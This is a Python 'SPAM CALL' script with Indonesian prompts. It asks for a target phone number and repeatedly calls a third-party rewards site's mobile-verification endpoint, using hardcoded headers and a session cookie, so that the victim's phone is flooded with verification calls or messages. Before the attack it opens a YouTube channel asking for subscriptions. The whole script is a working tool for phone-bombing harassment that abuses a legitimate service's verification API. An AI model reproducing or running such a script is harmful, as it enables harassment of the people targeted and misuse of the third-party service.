#APIWAT
import requests,json,os,time
from requests import post
from requests import get
#Warna
red   = '\x1b[31m' # Merah
green = '\x1b[32m' # Hijau
yellow = '\x1b[33m' # Kuning
blue  = '\x1b[34m' # Biru
magenta = '\x1b[35m' # Ungu
cyan  = '\x1b[36m' # Biru Muda
white = '\x1b[37m' # Putih
reset = '\x1b[39m' # Reset Warna ( Kembali Ke Warna Awal )
brblack = '\x1b[90m' # Hitam Terang
R = '\x1b[91m' # Merah Terang
brgreen = '\x1b[92m' # Hijau Terang
k = '\x1b[93m' # Kuning Terang
brblue = '\x1b[94m' # Biru Terang
brmgnt = '\x1b[95m' # Ungu Terang
brcyan = '\x1b[96m' # Biru Muda Terang
G = '\x1b[97m' # Putih Terang
#system
time.sleep (1)
print ("\t\x1b[91mTUNGGU NGNTOT LODING.....")
time.sleep (5)
os.system ("clear")
time.sleep (1)
print ("\x1b[91mNOTE !!!")
time.sleep (1)
print ("\x1b[96m[\x1b[91m1\x1b[96m] \x1b[96mSUSBRAIK DULU KAWAN \x1b[91m:V")
time.sleep (1)
os.system("xdg-open https://youtube.com/channel/UCwmhMExJ5V82NRYMUBR8Q6A")
time.sleep (8)
print ("\x1b[96m[\x1b[91m2\x1b[96m] \x1b[96mMAKASIH UDAH SUSBRAIK \x1b[91m:)")
time.sleep (1)
print ("\x1b[91m")
os.system ("clear")
time.sleep (1)
banner = """\t───────────────────────
\t─██████──────────██████
\t─██▒▒██──────────██▒▒██
\t─██▒▒██──────────██▒▒██
\t─██▒▒██──────────██▒▒██
\t─██▒▒██──██████──██▒▒██
\t─██▒▒██──██▒▒██──██▒▒██
\t─██▒▒██──██▒▒██──██▒▒██
\t─██▒▒██████▒▒██████▒▒██
\t─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
\t─██▒▒██████▒▒██████▒▒██
\t─██████──██████──██████
\t───────────────────────
\t       SPAM CALL
\t       ========="""
print (banner)
print ("\x1b[96m")
time.sleep (1)
banner = """========================================
[•] Youtube : Z-NIGHTSHOT
[•] Github  : https://github.com/autozagamerthch
========================================"""
print (banner)
time.sleep (1)
print ("\x1b[91m--------------\x1b[96m--------------")
print ("\x1b[96mMASUKKAN NOMOR\x1b[91m TARGET (66**)")
print ("\x1b[91m--------------\x1b[96m--------------")
print ("")
time.sleep (1)
nomor = input("\x1b[96m[\x1b[91m•\x1b[96m] Nomor \x1b[91m:\x1b[96m0")
print ("")
time.sleep (1)
print ("\x1b[96mMAXIMAL JUMLAH \x1b[91m(1)")
print ("")
time.sleep (1)
jumlah = int(input("\x1b[96m[\x1b[91m•\x1b[96m] Jumlah \x1b[91m:\x1b[96m "))

ua = {
"Host":"id.jagreward.com",
"Connection":"keep-alive",
"Accept":"*/*",
"X-Requested-With":"XMLHttpRequest",
"User-Agent":"Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer":"https://id.jagreward.com/member/register/",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,tr;q=0.6",
'Cookie':'PHPSESSID=p5rqeu425lsq5q2rn521ojpdgc; DAPROPS=sjs.webGlRenderer:Adreno (TM) 308|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdeviceAspectRatio:9/16|sdevicePixelRatio:2|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0; _ga=GA1.3.1296368646.1641389961; _gid=GA1.3.1038060740.1641389961; _gat=1'
}

url = f"https://id.jagreward.com/member/verify-mobile/{nomor}/"
for i in range(int(jumlah)):
  req = requests.get(url,headers=ua).text
  lock = json.loads(req)
  xn = lock["result"]
  xx = lock["message"]
  print (f"[•]Result : {xn}, message: {xx}")
  time.sleep (3)

#SUBSCRIBE Z-NightShot
#APIWAT
